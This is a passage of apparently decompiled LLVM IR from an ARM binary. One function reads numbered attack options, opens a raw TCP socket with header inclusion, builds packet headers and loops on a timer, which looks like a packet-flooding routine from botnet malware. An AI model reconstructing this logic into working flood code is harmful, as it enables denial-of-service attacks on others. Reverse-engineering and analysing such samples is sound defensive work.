  %v1_d210 = load i32, i32* @r8, align 4
  %v2_d210 = add i32 %v1_d210, %v5_d20c
  store i32 %v2_d210, i32* %r3.global-to-local, align 4
  store i32 %v4_cbe4, i32* %ip.global-to-local, align 4
  %v1_d218 = add i32 %v2_d210, 20
  %v2_d218 = inttoptr i32 %v1_d218 to i8*
  %v3_d218 = load i8, i8* %v2_d218, align 1
  %v4_d218 = zext i8 %v3_d218 to i32
  store i32 %v4_d218, i32* %r2.global-to-local, align 4
  %v4_d21c = mul i32 %v1_d21c, 4
  %v5_d21c = add i32 %v4_d21c, %v4_cbe4
  %v6_d21c = inttoptr i32 %v5_d21c to i32*
  %v7_d21c = load i32, i32* %v6_d21c, align 4
  store i32 %v7_d21c, i32* @r5, align 4
  %v2_d220 = icmp ugt i8 %v3_d218, 30
  %v7_d220 = icmp eq i8 %v3_d218, 31
  store i1 %v7_d220, i1* %cpsr_z.global-to-local, align 1
  %v1_d224 = add i32 %v7_d21c, 20
  store i32 %v1_d224, i32* @r6, align 4
  %v2_d228 = xor i1 %v7_d220, true
  %v3_d228 = and i1 %v2_d220, %v2_d228
  br i1 %v3_d228, label %dec_label_pc_d108, label %dec_label_pc_d22c

dec_label_pc_d22c:                                ; preds = %dec_label_pc_d208
  %v1_d22c = add i32 %v2_d210, 16
  %v2_d22c = inttoptr i32 %v1_d22c to i32*
  %v3_d22c = load i32, i32* %v2_d22c, align 4
  %v0_d230 = call i32 @function_105b0()
  %v3_d234 = load i32, i32* %stack_var_-40, align 4
  %v5_d23c = mul i32 %v3_d234, 24
  %v1_d244 = load i32, i32* @r8, align 4
  %v2_d244 = add i32 %v1_d244, %v5_d23c
  store i32 %v2_d244, i32* %r1.global-to-local, align 4
  %v1_d248 = and i32 %v3_d22c, 65280
  store i32 %v1_d248, i32* %r3.global-to-local, align 4
  %v1_d240 = udiv i32 %v3_d22c, 256
  %v3_d24c = and i32 %v1_d240, 65280
  store i32 %v3_d24c, i32* %r2.global-to-local, align 4
  %v3_d250 = mul i32 %v3_d22c, 16777216
  store i32 %v3_d250, i32* %ip.global-to-local, align 4
  %v1_d254 = add i32 %v2_d244, 20
  %v2_d254 = inttoptr i32 %v1_d254 to i8*
  %v3_d254 = load i8, i8* %v2_d254, align 1
  %v4_d254 = zext i8 %v3_d254 to i32
  %v4_d258 = mul nuw nsw i32 %v1_d248, 256
  %v5_d258 = or i32 %v4_d258, %v3_d250
  store i32 %v5_d258, i32* %ip.global-to-local, align 4
  %v2_d260 = call i32 @llvm.bswap.i32(i32 %v3_d22c)
  %v7_d264 = lshr i32 %v0_d230, %v4_d254
  %v8_d264 = add i32 %v7_d264, %v2_d260
  store i32 %v8_d264, i32* %r2.global-to-local, align 4
  %v2_d280 = call i32 @llvm.bswap.i32(i32 %v8_d264)
  store i32 %v2_d280, i32* %r3.global-to-local, align 4
  store i32 %v6_cdb4, i32* %r1.global-to-local, align 4
  store i1 %v7_d10c, i1* %cpsr_z.global-to-local, align 1
  %v1_d28c = load i32, i32* @r5, align 4
  %v2_d28c = add i32 %v1_d28c, 16
  %v3_d28c = inttoptr i32 %v2_d28c to i32*
  store i32 %v2_d280, i32* %v3_d28c, align 4
  br i1 %v2_d10c, label %dec_label_pc_d294, label %dec_label_pc_d114

dec_label_pc_d294:                                ; preds = %dec_label_pc_d22c, %dec_label_pc_d108
  %v0_d294 = call i32 @function_105b0()
  store i32 %v3_ce28, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* @r4, align 4
  store i1 %v9_d2a4, i1* %cpsr_z.global-to-local, align 1
  %v1_d2a8 = load i32, i32* @r5, align 4
  %v2_d2a8 = add i32 %v1_d2a8, 12
  %v3_d2a8 = inttoptr i32 %v2_d2a8 to i32*
  store i32 %v0_d294, i32* %v3_d2a8, align 4
  br i1 %v9_d2a4, label %dec_label_pc_d2b0, label %dec_label_pc_d294.dec_label_pc_d128_crit_edge

dec_label_pc_d294.dec_label_pc_d128_crit_edge:    ; preds = %dec_label_pc_d294
  %v1_d12c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d128

dec_label_pc_d2b0:                                ; preds = %dec_label_pc_d294, %dec_label_pc_d114
  %v0_d2b0 = call i32 @function_105b0()
  %v1_d2b0 = trunc i32 %v0_d2b0 to i8
  %v4_d2b425 = udiv i32 %v0_d2b0, 256
  %v1_d2b8 = trunc i32 %v4_d2b425 to i8
  %v2_d2b8 = load i32, i32* @r5, align 4
  %v3_d2b8 = add i32 %v2_d2b8, 5
  %v4_d2b8 = inttoptr i32 %v3_d2b8 to i8*
  store i8 %v1_d2b8, i8* %v4_d2b8, align 1
  store i32 %v3_ce2c, i32* %r3.global-to-local, align 4
  %v1_d2c0 = load i32, i32* @r4, align 4
  %v9_d2c0 = icmp eq i32 %v3_ce2c, %v1_d2c0
  store i1 %v9_d2c0, i1* %cpsr_z.global-to-local, align 1
  %v3_d2c4 = load i32, i32* @r5, align 4
  %v4_d2c4 = add i32 %v3_d2c4, 4
  %v5_d2c4 = inttoptr i32 %v4_d2c4 to i8*
  store i8 %v1_d2b0, i8* %v5_d2c4, align 1
  %v0_d2c8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d2c8, label %dec_label_pc_d2cc, label %dec_label_pc_d2b0.dec_label_pc_d134_crit_edge

dec_label_pc_d2b0.dec_label_pc_d134_crit_edge:    ; preds = %dec_label_pc_d2b0
  %v1_d138.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d134

dec_label_pc_d2cc:                                ; preds = %dec_label_pc_d2b0, %dec_label_pc_d128
  %v0_d2cc = call i32 @function_105b0()
  %v1_d2cc = trunc i32 %v0_d2cc to i8
  store i32 %v3_ce30, i32* %ip.global-to-local, align 4
  %v4_d2d4 = sdiv i32 %v0_d2cc, 256
  store i32 %v4_d2d4, i32* %r3.global-to-local, align 4
  %v1_d2d8 = load i32, i32* @r4, align 4
  %v9_d2d8 = icmp eq i32 %v3_ce30, %v1_d2d8
  store i1 %v9_d2d8, i1* %cpsr_z.global-to-local, align 1
  %v3_d2dc = load i32, i32* @r5, align 4
  %v4_d2dc = add i32 %v3_d2dc, 20
  %v5_d2dc = inttoptr i32 %v4_d2dc to i8*
  store i8 %v1_d2cc, i8* %v5_d2dc, align 1
  %v0_d2e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_d2e0 = trunc i32 %v0_d2e0 to i8
  %v2_d2e0 = load i32, i32* @r6, align 4
  %v3_d2e0 = add i32 %v2_d2e0, 1
  %v4_d2e0 = inttoptr i32 %v3_d2e0 to i8*
  store i8 %v1_d2e0, i8* %v4_d2e0, align 1
  %v0_d2e4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d2e4, label %dec_label_pc_d2e8, label %dec_label_pc_d2cc.dec_label_pc_d140_crit_edge

dec_label_pc_d2cc.dec_label_pc_d140_crit_edge:    ; preds = %dec_label_pc_d2cc
  %v1_d144.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d140

dec_label_pc_d2e8:                                ; preds = %dec_label_pc_d2cc, %dec_label_pc_d134
  %v0_d2e8 = call i32 @function_105b0()
  %v1_d2e8 = trunc i32 %v0_d2e8 to i8
  store i32 %v6_ccb4, i32* %r1.global-to-local, align 4
  %v4_d2f0 = sdiv i32 %v0_d2e8, 256
  store i32 %v4_d2f0, i32* %r3.global-to-local, align 4
  %v1_d2f4 = load i32, i32* @r4, align 4
  %v9_d2f4 = icmp eq i32 %v6_ccb4, %v1_d2f4
  store i1 %v9_d2f4, i1* %cpsr_z.global-to-local, align 1
  %v1_d2f8 = trunc i32 %v4_d2f0 to i8
  %v2_d2f8 = load i32, i32* @r6, align 4
  %v3_d2f8 = add i32 %v2_d2f8, 3
  %v4_d2f8 = inttoptr i32 %v3_d2f8 to i8*
  store i8 %v1_d2f8, i8* %v4_d2f8, align 1
  %v3_d2fc = load i32, i32* @r6, align 4
  %v4_d2fc = add i32 %v3_d2fc, 2
  %v5_d2fc = inttoptr i32 %v4_d2fc to i8*
  store i8 %v1_d2e8, i8* %v5_d2fc, align 1
  %v0_d300 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d300, label %dec_label_pc_d304, label %dec_label_pc_d2e8.dec_label_pc_d14c_crit_edge

dec_label_pc_d2e8.dec_label_pc_d14c_crit_edge:    ; preds = %dec_label_pc_d2e8
  %v1_d150.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d14c

dec_label_pc_d304:                                ; preds = %dec_label_pc_d2e8, %dec_label_pc_d140
  %v0_d304 = call i32 @function_105b0()
  store i32 %v6_ccd0, i32* %r2.global-to-local, align 4
  %v1_d30c = load i32, i32* @r4, align 4
  %v9_d30c = icmp eq i32 %v6_ccd0, %v1_d30c
  store i1 %v9_d30c, i1* %cpsr_z.global-to-local, align 1
  %v1_d310 = load i32, i32* @r6, align 4
  %v2_d310 = add i32 %v1_d310, 4
  %v3_d310 = inttoptr i32 %v2_d310 to i32*
  store i32 %v0_d304, i32* %v3_d310, align 4
  br i1 %v9_d30c, label %dec_label_pc_d318, label %dec_label_pc_d158

dec_label_pc_d318:                                ; preds = %dec_label_pc_d304, %dec_label_pc_d14c
  %v0_d318 = call i32 @function_105b0()
  store i32 %v1_cda0, i32* %r3.global-to-local, align 4
  store i1 %v2_d320, i1* %cpsr_z.global-to-local, align 1
  %v1_d324 = load i32, i32* @r6, align 4
  %v2_d324 = add i32 %v1_d324, 8
  %v3_d324 = inttoptr i32 %v2_d324 to i32*
  store i32 %v0_d318, i32* %v3_d324, align 4
  br i1 %v2_d320, label %dec_label_pc_d164, label %dec_label_pc_d32c

dec_label_pc_d32c:                                ; preds = %dec_label_pc_d158, %dec_label_pc_d318
  %v0_d32c = load i32, i32* @r5, align 4
  %v1_d32c = add i32 %v0_d32c, 40
  store i32 %v1_d32c, i32* @r4, align 4
  %v0_d334 = load i32, i32* @sl, align 4
  store i32 %v0_d334, i32* %r1.global-to-local, align 4
  %v2_d338 = call i32 @function_10664(i32 %v1_d32c, i32 %v0_d334)
  %v0_d33c = load i32, i32* @r7, align 4
  %v1_d33c = trunc i32 %v0_d33c to i8
  %v2_d33c = load i32, i32* @r4, align 4
  %v3_d33c = load i32, i32* @sl, align 4
  %v4_d33c = add i32 %v3_d33c, %v2_d33c
  %v5_d33c = inttoptr i32 %v4_d33c to i8*
  store i8 %v1_d33c, i8* %v5_d33c, align 1
  br label %dec_label_pc_d164

dec_label_pc_d344:                                ; preds = %dec_label_pc_d164, %dec_label_pc_d0cc
  %v2_d348 = call i32 @time(i32* null)
  store i32 %v2_cdc4, i32* %r1.global-to-local, align 4
  %v9_d350 = icmp eq i32 %v2_cdc4, %v2_d348
  store i1 %v9_d350, i1* %cpsr_z.global-to-local, align 1
  %v6_d354 = icmp slt i32 %v2_cdc4, %v2_d348
  br i1 %v6_d354, label %dec_label_pc_d358, label %dec_label_pc_d0cc

dec_label_pc_d358:                                ; preds = %dec_label_pc_d344, %dec_label_pc_cbb4, %dec_label_pc_d360
  %v29_d35c = phi i32 [ %v3_cdd8, %dec_label_pc_cbb4 ], [ %v1_d364, %dec_label_pc_d360 ], [ %v2_d348, %dec_label_pc_d344 ]
  store i32 %v18_cbb4, i32* %sb.global-to-local, align 4
  store i32 %v24_cbb4, i32* %fp.global-to-local, align 4
  ret i32 %v29_d35c

dec_label_pc_d360:                                ; preds = %dec_label_pc_cde8
  %v1_d364 = call i32 @close(i32 %v3_cdd8)
  br label %dec_label_pc_d358

; uselistorder directives
  uselistorder i32 %v4_d2f0, { 1, 0 }
  uselistorder i32 %v2_d280, { 1, 0 }
  uselistorder i32 %v3_d250, { 1, 0 }
  uselistorder i32 %v3_d22c, { 1, 3, 2, 0 }
  uselistorder i32 %v1_d1f8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_d184, { 1, 0, 2 }
  uselistorder i32 %v1_d0e0, { 1, 0, 2 }
  uselistorder i1 %v2_d320, { 2, 3, 1, 0 }
  uselistorder i1 %v9_d2a4, { 2, 3, 1, 0 }
  uselistorder i1 %v7_d10c, { 2, 1, 0 }
  uselistorder i32 %v1_d0bc, { 1, 0, 2, 3 }
  uselistorder i32 %v1_cef4, { 1, 0 }
  uselistorder i32 %v1_cee4, { 1, 2, 0 }
  uselistorder i32 %v1_cee0, { 2, 0, 1 }
  uselistorder i32 %v1_ced0, { 1, 0 }
  uselistorder i32 %v1_ceb0, { 1, 0 }
  uselistorder i32 %v1_ceac, { 1, 0 }
  uselistorder i32 %v1_cea8, { 1, 0 }
  uselistorder i32 %v1_ce84, { 1, 0 }
  uselistorder i1 %v2_ce34, { 1, 0, 2, 3 }
  uselistorder i32 %v3_ce28, { 1, 2, 0, 3 }
  uselistorder i32 %v0_ce20, { 0, 1, 3, 2 }
  uselistorder i1 %v7_ce08, { 1, 0 }
  uselistorder i1 %v7_cddc, { 1, 0 }
  uselistorder i32 %v3_cdd8, { 3, 1, 4, 2, 0 }
  uselistorder i32 %v2_cdc4, { 2, 1, 0 }
  uselistorder i32 %v6_cdb4, { 3, 4, 0, 5, 1, 2 }
  uselistorder i32 %v1_cda0, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_ccd0, { 3, 2, 1, 0 }
  uselistorder i32 %v6_ccb4, { 2, 5, 4, 3, 1, 0 }
  uselistorder i32 %v1_cc64, { 1, 0 }
  uselistorder i8 %v5_cc54, { 1, 0 }
  uselistorder i32 %v6_cc38, { 1, 0 }
  uselistorder i32 %v6_cbfc, { 1, 0 }
  uselistorder i32 %v4_cbe4, { 0, 3, 1, 2 }
  uselistorder i32 %v1_cbb8, { 2, 3, 4, 1, 5, 6, 7, 9, 0, 8 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 13, 11, 12 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 14, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 11, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 31, 29, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 42, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 45, 44, 46, 47, 48, 49, 51, 50, 53, 52, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 8, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 19, 11, 12, 13, 14, 15, 16, 17, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder label %dec_label_pc_d358, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d32c, { 1, 0 }
  uselistorder label %dec_label_pc_d164, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d0cc, { 1, 0 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_d370(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_d370:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_d370 = load i32, i32* @r4, align 4
  %v6_d370 = load i32, i32* @r5, align 4
  %v9_d370 = load i32, i32* @r6, align 4
  %v12_d370 = load i32, i32* @r7, align 4
  %v1_d374 = urem i32 %arg2, 256
  store i32 %v1_d374, i32* %fp.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %v1_d374, i32* %r0.global-to-local, align 4
  %v1_d38c = urem i32 %arg4, 256
  store i32 %v1_d38c, i32* @r4, align 4
  store i32 %arg5, i32* @r5, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v2_d39c = call i32* @calloc(i32 %v1_d374, i32 4)
  %v3_d39c = ptrtoint i32* %v2_d39c to i32
  %v0_d3a0 = load i32, i32* @r5, align 4
  store i32 %v0_d3a0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_d3a8 = load i32, i32* @r7, align 4
  store i32 %v0_d3a8, i32* %r3.global-to-local, align 4
  store i32 %v3_d39c, i32* %sb.global-to-local, align 4
  %v0_d3b0 = load i32, i32* @r4, align 4
  store i32 %v0_d3b0, i32* %r0.global-to-local, align 4
  %v4_d3b4 = inttoptr i32 %v0_d3a0 to i32*
  %v5_d3b4 = call i32 @function_ad24(i32 %v0_d3b0, i32* %v4_d3b4, i32 2, i32 %v0_d3a8)
  %v1_d3c0 = urem i32 %v5_d3b4, 256
  store i32 %v1_d3c0, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_d3cc = load i32, i32* @r5, align 4
  store i32 %v0_d3cc, i32* %r1.global-to-local, align 4
  %v0_d3d0 = load i32, i32* @r4, align 4
  store i32 %v0_d3d0, i32* %r0.global-to-local, align 4
  %v5_d3d4 = trunc i32 %v5_d3b4 to i8
  %v6_d3d8 = inttoptr i32 %v0_d3cc to i32*
  %v7_d3d8 = call i32 @function_ad24(i32 %v0_d3d0, i32* %v6_d3d8, i32 3, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1))
  %v0_d3dc = load i32, i32* @r5, align 4
  store i32 %v0_d3dc, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_d3ec = load i32, i32* @r4, align 4
  store i32 %v0_d3ec, i32* %r0.global-to-local, align 4
  %v5_d3f0 = inttoptr i32 %v0_d3dc to i32*
  %v6_d3f0 = call i32 @function_ad24(i32 %v0_d3ec, i32* %v5_d3f0, i32 4, i32 64)
  %v1_d3f8 = urem i32 %v6_d3f0, 256
  store i32 %v1_d3f8, i32* %ip.global-to-local, align 4
  %v0_d3fc = load i32, i32* @r5, align 4
  store i32 %v0_d3fc, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_d408 = load i32, i32* @r4, align 4
  store i32 %v0_d408, i32* %r0.global-to-local, align 4
  %v6_d410 = inttoptr i32 %v0_d3fc to i32*
  %v7_d410 = call i32 @function_ad24(i32 %v0_d408, i32* %v6_d410, i32 5, i32 1)
  %v1_d41c = urem i32 %v7_d410, 256
  store i32 %v1_d41c, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_d428 = load i32, i32* @r5, align 4
  store i32 %v0_d428, i32* %r1.global-to-local, align 4
  %v0_d42c = load i32, i32* @r4, align 4
  store i32 %v0_d42c, i32* %r0.global-to-local, align 4
  %v5_d434 = inttoptr i32 %v0_d428 to i32*
  %v6_d434 = call i32 @function_ad24(i32 %v0_d42c, i32* %v5_d434, i32 6, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1))
  %v0_d440 = load i32, i32* @r5, align 4
  store i32 %v0_d440, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_d44c = load i32, i32* @r4, align 4
  store i32 %v0_d44c, i32* %r0.global-to-local, align 4
  %v5_d450 = inttoptr i32 %v0_d440 to i32*
  %v6_d450 = call i32 @function_ad24(i32 %v0_d44c, i32* %v5_d450, i32 7, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1))
  %v0_d45c = load i32, i32* @r5, align 4
  store i32 %v0_d45c, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_d468 = load i32, i32* @r4, align 4
  store i32 %v0_d468, i32* %r0.global-to-local, align 4
  %v5_d46c = inttoptr i32 %v0_d45c to i32*
  %v6_d46c = call i32 @function_ad24(i32 %v0_d468, i32* %v5_d46c, i32 16, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1))
  %v0_d470 = load i32, i32* @r5, align 4
  store i32 %v0_d470, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v0_d47c = load i32, i32* @r7, align 4
  store i32 %v0_d47c, i32* %r3.global-to-local, align 4
  %v0_d480 = load i32, i32* @r4, align 4
  store i32 %v0_d480, i32* %r0.global-to-local, align 4
  %v5_d484 = inttoptr i32 %v0_d470 to i32*
  %v6_d484 = call i32 @function_ad24(i32 %v0_d480, i32* %v5_d484, i32 17, i32 %v0_d47c)
  %v0_d488 = load i32, i32* @r5, align 4
  store i32 %v0_d488, i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v0_d494 = load i32, i32* @r7, align 4
  store i32 %v0_d494, i32* %r3.global-to-local, align 4
  %v0_d498 = load i32, i32* @r4, align 4
  store i32 %v0_d498, i32* %r0.global-to-local, align 4
  %v5_d49c = inttoptr i32 %v0_d488 to i32*
  %v6_d49c = call i32 @function_ad24(i32 %v0_d498, i32* %v5_d49c, i32 10, i32 %v0_d494)
  %v0_d4a0 = load i32, i32* @r5, align 4
  store i32 %v0_d4a0, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  %v0_d4ac = load i32, i32* @r7, align 4
  store i32 %v0_d4ac, i32* %r3.global-to-local, align 4
  %v0_d4b0 = load i32, i32* @r4, align 4
  store i32 %v0_d4b0, i32* %r0.global-to-local, align 4
  %v5_d4b4 = inttoptr i32 %v0_d4a0 to i32*
  %v6_d4b4 = call i32 @function_ad24(i32 %v0_d4b0, i32* %v5_d4b4, i32 11, i32 %v0_d4ac)
  %v0_d4b8 = load i32, i32* @r5, align 4
  store i32 %v0_d4b8, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v0_d4c4 = load i32, i32* @r7, align 4
  store i32 %v0_d4c4, i32* %r3.global-to-local, align 4
  %v0_d4c8 = load i32, i32* @r4, align 4
  store i32 %v0_d4c8, i32* %r0.global-to-local, align 4
  %v5_d4cc = inttoptr i32 %v0_d4b8 to i32*
  %v6_d4cc = call i32 @function_ad24(i32 %v0_d4c8, i32* %v5_d4cc, i32 12, i32 %v0_d4c4)
  %v0_d4d0 = load i32, i32* @r5, align 4
  store i32 %v0_d4d0, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_d4dc = load i32, i32* @r7, align 4
  store i32 %v0_d4dc, i32* %r3.global-to-local, align 4
  %v0_d4e0 = load i32, i32* @r4, align 4
  store i32 %v0_d4e0, i32* %r0.global-to-local, align 4
  %v5_d4e4 = inttoptr i32 %v0_d4d0 to i32*
  %v6_d4e4 = call i32 @function_ad24(i32 %v0_d4e0, i32* %v5_d4e4, i32 13, i32 %v0_d4dc)
  %v0_d4e8 = load i32, i32* @r5, align 4
  store i32 %v0_d4e8, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_d4f8 = load i32, i32* @r4, align 4
  store i32 %v0_d4f8, i32* %r0.global-to-local, align 4
  %v5_d4fc = inttoptr i32 %v0_d4e8 to i32*
  %v6_d4fc = call i32 @function_ad24(i32 %v0_d4f8, i32* %v5_d4fc, i32 14, i32 1)
  %v0_d500 = load i32, i32* @r5, align 4
  store i32 %v0_d500, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_d50c = load i32, i32* @r7, align 4
  store i32 %v0_d50c, i32* %r3.global-to-local, align 4
  %v0_d510 = load i32, i32* @r4, align 4
  store i32 %v0_d510, i32* %r0.global-to-local, align 4
  %v5_d514 = inttoptr i32 %v0_d500 to i32*
  %v6_d514 = call i32 @function_ad24(i32 %v0_d510, i32* %v5_d514, i32 15, i32 %v0_d50c)
  %v0_d51c = load i32, i32* @r5, align 4
  store i32 %v0_d51c, i32* %r1.global-to-local, align 4
  %v2_d520 = load i32, i32* @global_var_1c21c.135, align 4
  store i32 %v2_d520, i32* %r3.global-to-local, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_d52c = load i32, i32* @r4, align 4
  store i32 %v0_d52c, i32* %r0.global-to-local, align 4
  %v5_d530 = inttoptr i32 %v0_d51c to i32*
  %v6_d530 = call i32 @function_acb8(i32 %v0_d52c, i32* %v5_d530, i32 24, i32 %v2_d520, i32 %v6_d514)
  %v0_d538 = load i32, i32* @r7, align 4
  store i32 %v0_d538, i32* %r0.global-to-local, align 4
  %v1_d53c = inttoptr i32 %v0_d538 to i32*
  %v2_d53c = call i32 @time(i32* %v1_d53c)
  %v1_d540 = load i32, i32* @r6, align 4
  %v2_d540 = add i32 %v1_d540, %v2_d53c
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_d554 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_d554, i32* %r0.global-to-local, align 4
  %v7_d558 = icmp eq i32 %v3_d554, -1
  store i1 %v7_d558, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_d554, i32* %sl.global-to-local, align 4
  br i1 %v7_d558, label %dec_label_pc_dad4, label %dec_label_pc_d564

dec_label_pc_d564:                                ; preds = %dec_label_pc_d370
  store i32 1, i32* %stack_var_-40, align 4
  %v6_d56c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_d56c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_d574 = load i32, i32* @r7, align 4
  store i32 %v0_d574, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_d580 = call i32 @setsockopt(i32 %v0_d574, i32 3, i32 %v6_d56c, i32* nonnull %stack_var_-40, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_d580, i32* %r0.global-to-local, align 4
  %v7_d584 = icmp eq i32 %v6_d580, -1
  store i1 %v7_d584, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d584, label %dec_label_pc_dadc, label %dec_label_pc_d58c

dec_label_pc_d58c:                                ; preds = %dec_label_pc_d564
  %v3_d594 = mul i32 %v6_d450, 65536
  store i32 %v3_d594, i32* %r5.global-to-local, align 4
  %v3_d5a0 = mul i32 %v6_d434, 65536
  store i32 %v3_d5a0, i32* %r4.global-to-local, align 4
  %v3_d5a4 = urem i32 %v7_d3d8, 65536
  store i32 %v3_d5a4, i32* %ip.global-to-local, align 4
  %v3_d5a8 = urem i32 %v6_d434, 65536
  store i32 %v3_d5a8, i32* %r0.global-to-local, align 4
  %v3_d5ac = urem i32 %v6_d450, 65536
  store i32 %v3_d5ac, i32* %r2.global-to-local, align 4
  %v1_d5b0 = urem i32 %v6_d49c, 256
  store i32 %v1_d5b0, i32* %r3.global-to-local, align 4
  %v0_d5b4 = load i32, i32* %fp.global-to-local, align 4
  %v2_d5b4 = icmp eq i32 %v0_d5b4, 0
  store i1 %v2_d5b4, i1* %cpsr_z.global-to-local, align 1
  %v0_d5b8 = load i32, i32* @r7, align 4
  store i32 %v0_d5b8, i32* %stack_var_-40, align 4
  %tmp70 = icmp slt i32 %v0_d5b4, 1
  br i1 %tmp70, label %dec_label_pc_d874.preheader, label %dec_label_pc_d5d0

dec_label_pc_d5d0:                                ; preds = %dec_label_pc_d58c
  %v1_d5d8 = urem i32 %v7_d3d8, 256
  %v1_d5ec = urem i32 %v6_d450, 256
  %tmp71 = mul i32 %v6_d46c, 256
  %v1_d5f4 = and i32 %tmp71, 65280
  %tmp72 = udiv i32 %v6_d46c, 256
  %v4_d5f8 = urem i32 %tmp72, 256
